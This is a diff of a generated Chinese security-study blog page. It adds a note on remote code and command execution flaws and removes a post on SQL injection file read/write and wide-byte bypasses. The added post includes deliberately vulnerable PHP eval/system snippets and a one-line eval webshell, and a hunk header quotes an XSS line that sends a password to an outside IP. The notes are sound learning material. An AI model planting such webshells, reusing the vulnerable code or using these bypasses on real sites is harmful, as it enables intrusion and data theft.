@@ -64,6 +64,63 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-RCE代码命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2021-11-04T14:53:00.000Z" itemprop="datePublished">2021-11-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="RCE代码及命令执行漏洞"><a href="#RCE代码及命令执行漏洞" class="headerlink" title="RCE代码及命令执行漏洞"></a>RCE代码及命令执行漏洞</h4><p>RCE(remote code/command execute)  远程代码/命令执行漏洞</p>
+<p>如何产生：在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p>
+<h4 id="RCE漏洞危害"><a href="#RCE漏洞危害" class="headerlink" title="RCE漏洞危害"></a>RCE漏洞危害</h4><p>1、执行系统命令(Windows：DOS命令、linux)<br>2、执行脚本代码(php、java、python)</p>
+<h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><h5 id="RCE-漏洞产生相关性函数"><a href="#RCE-漏洞产生相关性函数" class="headerlink" title="RCE 漏洞产生相关性函数"></a>RCE 漏洞产生相关性函数</h5><p>PHP eval()函数<br>作用：把字符串按照PHP代码来计算</p>
+<?php
+$code=$_GET['x'];
+eval($code); 
+?>
+
+<p>PHP system()函数<br>作用：执行外部程序，并显示输出<br>外部程序：操作系统与环境<br>执行的代码以系统的命令为主</p>
+<?php
+$code=$_GET['x'];
+echo system($code); 
+?>
+
+<p>?id=1</p>
+<h5 id="漏洞形成条件：可控变量、漏洞函数"><a href="#漏洞形成条件：可控变量、漏洞函数" class="headerlink" title="漏洞形成条件：可控变量、漏洞函数"></a>漏洞形成条件：可控变量、漏洞函数</h5><p>可控变量：基本上是网址上的传参，就是传递参数值来达到改变变量值<br>漏洞函数：使用哪个函数对变量进行操作</p>
+<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>白盒测试：代码审计<br>黑盒测试：<br>1、漏洞工具–OpenVAS、Nessus等<br>2、公开漏洞–寻找类似目标网站的公开漏洞<br>3、手工看参数值及功能点–判定参数值的数据是否和代码相关</p>
+<h5 id="相关防御"><a href="#相关防御" class="headerlink" title="相关防御"></a>相关防御</h5><p>1、变量过滤或固定<br>2、禁用敏感函数<br>3、WAF产品防护</p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>​    1、墨者靶场黑盒测试功能点命令执行-命令注入执行分析<br>​    2、墨者靶场白盒代码及命令执行-PHP代码分析溯源-代码分析<br>​    echo <code>$_REQUEST[a]</code><br>​    反引号的作用就是将反引号内的Linux命令先执行,然后将执行结果赋予变量，linux特有<br>​    3、墨者靶场黑盒层 RCE 漏洞检测-公开漏洞<br>​    当前目录、根目录<br>​    4、一句话 Webshell 后门原理代码执行-拓展说明-中国菜刀、冰蝎、蚁剑<br>​                <?php @eval($_POST['xx']);?><br>​    @表示不回显错误结果</p>
+<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a>          RCE漏洞函数<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe</a>    命令注入执行分析<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe</a>    PHP代码分析溯源<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe</a>     Webmin未经身份验证的远程代码执行</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckvl2qehy000554vjh0gs0osc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-CSRF和SSRF漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -119,7 +176,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckvgf14ij0000xkvj09il9lm3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckvl2qehn000054vjgse195du" class="article-share-link">Share</a>
       
       
     </footer>
@@ -167,7 +224,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckvgf14jm000sxkvj33npcarc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckvl2qeih000r54vj1bhw8err" class="article-share-link">Share</a>
       
       
     </footer>
@@ -220,7 +277,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckvgf14ji000pxkvjeh7ehtiv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckvl2qeig000q54vjbyh64obs" class="article-share-link">Share</a>
       
       
     </footer>
@@ -264,7 +321,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckvgf14jt000zxkvjf1y86g4b" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckvl2qeim000x54vjayvs8w8r" class="article-share-link">Share</a>
       
       
     </footer>
@@ -309,7 +366,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckvgf14ju0011xkvj4dxa0met" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckvl2qeis001054vje5s9edx6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -362,7 +419,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckvgf14jv0014xkvj459i7rbe" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckvl2qeis001154vjh7d6huif" class="article-share-link">Share</a>
       
       
     </footer>
@@ -407,7 +464,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/" data-id="ckvgf14ju0012xkvj2nkado2p" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/" data-id="ckvl2qeiu001354vj0wmi2pqy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -468,7 +525,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ckvgf14jf000lxkvjbpuz1mgh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ckvl2qeid000m54vj21iq9muw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -527,53 +584,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" data-id="ckvgf14jf000kxkvj6wo884rj" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sql高低权限注入和敏感文件读写" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" class="article-date">
-  <time datetime="2021-10-01T00:56:26.000Z" itemprop="datePublished">2021-10-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">高低权限注入和敏感文件读写</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h4><p>高用户权限和低用户权限的不同</p>
-<p>跨库查询思路  前提：拥有高权限</p>
-<h4 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h4><h5 id="MySQL特有的函数"><a href="#MySQL特有的函数" class="headerlink" title="MySQL特有的函数"></a>MySQL特有的函数</h5><p>前提条件：在mysql.ini配置文件添加参数secure_file_priv = [空]<br>1、load_file()   — 读取函数<br>2、into outfile 或 into dumpfile — 导出函数</p>
-<p>​    </p>
-<h5 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h5><p>​     报错显示，遗留文件  phpinfo.php，漏洞报错，平台配置文件，爆破等</p>
-<p>常见读取文件列表：常见写入文件问题：魔术引号开关<br>magic_quotes_gpc<br>魔术引号：php内置的一个安全机制，默认是开启的，当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义<br>5.4.0版本以上的把这个功能撤除了。<br>类似PHP中的addslashes()函数</p>
-<h5 id="魔术引号绕过方法"><a href="#魔术引号绕过方法" class="headerlink" title="魔术引号绕过方法"></a>魔术引号绕过方法</h5><p>1、编码绕过<br>2、宽字节绕过(前提数据库编码是gbk)<br>%df’<br>%df%5c%27 = 縗  失去转义效果<br>show variables like ‘%char%’;  查看编码系统字符集设置<br>set character_set_client = gbk; 修改字符集编码方式<br>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/105893529">https://blog.csdn.net/qq_46091464/article/details/105893529</a></p>
-<p>​    低版本注入配合读取或暴力<br>​     通过字典跑或猜再进行读取</p>
-<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>高权限注入跨库查询操作测试<br>高权限注入文件读写操作测试<br>魔术引号开启后相关操作测试  宽字节绕过：<a target="_blank" rel="noopener" href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a> 在线靶场</p>
-<h5 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a>   常见的load_file()读取的敏感信息</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="ckvgf14jg000mxkvj891c2bz8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" data-id="ckvl2qeic000l54vjec6ihxld" class="article-share-link">Share</a>
       
       
     </footer>
@@ -619,6 +630,10 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       <ul>
         
           <li>
+            <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
           </li>
         
@@ -632,10 +647,6 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
         
           <li>
             <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/">文件上传漏洞的上传逻辑安全</a>
           </li>
         
       </ul>
